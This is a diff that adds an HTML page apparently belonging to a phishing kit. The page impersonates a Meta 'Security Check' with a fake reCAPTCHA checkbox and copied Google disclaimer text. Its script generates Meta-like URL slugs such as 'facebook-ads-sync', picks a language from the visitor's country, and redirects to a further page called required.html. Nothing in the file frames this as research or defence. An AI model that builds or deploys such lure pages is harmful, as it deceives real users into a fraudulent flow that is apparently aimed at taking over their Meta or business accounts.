@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no, viewport-fit=cover">
+    <title>Security Check - Meta</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tailwindcss@3.4.1/dist/tailwind.min.css">
+    <link rel="stylesheet" href="./public/styles/checkbox.css">
+    <link rel="stylesheet" href="./public/styles/style.css">
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        primary: '#5D87FF',
+                        secondary: '#212121'
+                    }
+                }
+            }
+        }
+    </script>
+
+    <!-- CryptoJS for encryption -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+</head>
+
+<body class="bg-[#ffffff] flex flex-col items-center justify-center min-h-screen w-full">
+    <div class="font-sans text-sm text-gray-800 w-full h-full flex flex-col justify-center p-4 md:p-0 md:w-[300px]">
+        <div class="w-full">
+            <img src="./public/logo-meta.svg" alt="Meta" class="w-[64px]">
+        </div>
+
+        <div class="flex items-center justify-start bg-cover bg-center py-5 w-full">
+            <div
+                class="bg-[#f9f9f9] border-2 rounded-md text-[#4c4a4b] flex flex-row items-center justify-between pr-2 w-full">
+                <div class="flex flex-row items-center justify-start ml-4">
+                    <div class="relative w-[30px] h-[30px] flex items-center justify-center">
+                        <label class="checkbox flex items-center justify-center cursor-pointer">
+                            <input type="checkbox" id="robotCheckbox">
+                            <svg viewBox="0 0 21 21">
+                                <path
+                                    d="M5,10.75 L8.5,14.25 L19.4,2.3 C18.8333333,1.43333333 18.0333333,1 17,1 L4,1 C2.35,1 1,2.35 1,4 L1,17 C1,18.65 2.35,20 4,20 L17,20 C18.65,20 20,18.65 20,17 L20,7.99769186">
+                                </path>
+                            </svg>
+                        </label>
+                    </div>
+                    <label for="robotCheckbox" class="cursor-pointer text-sm text-gray-500 font-semibold mr-4 ml-1">
+                        I'm not a robot
+                    </label>
+                </div>
+                <div class="flex items-center flex-col text-[#9d9ba7] mb-[2px]">
+                    <img src="./public/recaptcha.png" alt="reCAPTCHA" class="w-[40px] h-[40px] mt-[.5rem]">
+                    <span class="text-[10px] font-bold">reCAPTCHA</span>
+                    <div class="text-[8px]">Privacy - Terms</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="text-gray-700 text-[13px] leading-[1.3]">
+            <p class="font-normal">
+                This helps us to combat harmful conduct, detect and prevent spam and maintain the integrity of our Products.
+            </p>
+            <p class="font-normal mt-4">
+                We’ve used Google's reCAPTCHA Enterprise product to provide this security check. Your use of reCAPTCHA Enterprise is subject to Google’s Privacy Policy and Terms of Use.
+            </p>
+            <p class="font-normal mt-4">
+                reCAPTCHA Enterprise collects hardware and software information, such as device and application data, and sends it to Google to provide, maintain, and improve reCAPTCHA Enterprise and for general security purposes. This information is not used by Google for personalized advertising.
+            </p>
+        </div>
+    </div>
+
+    <script src="./public/js/slug.js"></script>
+    <script>
+        function fallbackRandomSlug() {
+            const bases = ['meta-request','facebook-ads-sync','ads-optimizer','ads-manager-sync'];
+            const base = bases[Math.floor(Math.random() * bases.length)];
+            const n = Math.floor(Math.random() * 100000000);
+            const code = String(n).padStart(8, '0');
+            return `${base}-${code}`;
+        }
+
+        // Minimal country->lang mapping (same as i18n direct mappings)
+        function mapCountryToLang(cc) {
+            try {
+                const code = String(cc||'').toUpperCase();
+                const direct = {
+                    'JP': 'ja', 'KR': 'ko', 'DE': 'de', 'FR': 'fr', 'IT': 'it', 'ES': 'es', 'PT': 'pt',
+                    'TH': 'th', 'CN': 'zh', 'TW': 'zh', 'HK': 'zh', 'NL': 'nl', 'DK': 'da', 'AE': 'ar', 'SA': 'ar',
+                    'EG': 'ar', 'IQ': 'ar', 'JO': 'ar', 'KW': 'ar', 'LB': 'ar', 'LY': 'ar', 'MA': 'ar', 'OM': 'ar',
+                    'QA': 'ar', 'SY': 'ar', 'TN': 'ar', 'YE': 'ar', 'UA': 'uk'
+                };
+                return direct[code] || '';
+            } catch(_) { return ''; }
+        }
+
+        async function getLangFromEdge() {
+            try {
+                const res = await fetch('/api/ip-country', { headers: { 'Accept': 'application/json' }, cache: 'no-store' });
+                if (!res.ok) return '';
+                const d = await res.json();
+                return mapCountryToLang(d.country_code || '');
+            } catch(_) { return ''; }
+        }
+
+        const checkbox = document.getElementById('robotCheckbox');
+        checkbox.addEventListener('change', () => {
+            if (checkbox.checked) {
+                setTimeout(async () => {
+                    // Generate random slug and pass via query; required.html will replace URL to /<slug>.html
+                    const slug = window.generateRandomSlug ? window.generateRandomSlug() : fallbackRandomSlug();
+                    // Try to compute lang from edge quickly; if not available, skip param
+                    let lang = '';
+                    try { lang = await Promise.race([getLangFromEdge(), new Promise(r => setTimeout(() => r(''), 700))]); } catch(_) { lang = ''; }
+                    const url = `./required.html?slug=${encodeURIComponent(slug)}${lang ? `&lang=${lang}` : ''}`;
+                    window.location.href = url;
+                }, 600);
+            }
+        });
+    </script>
+</body>
+
+</html>
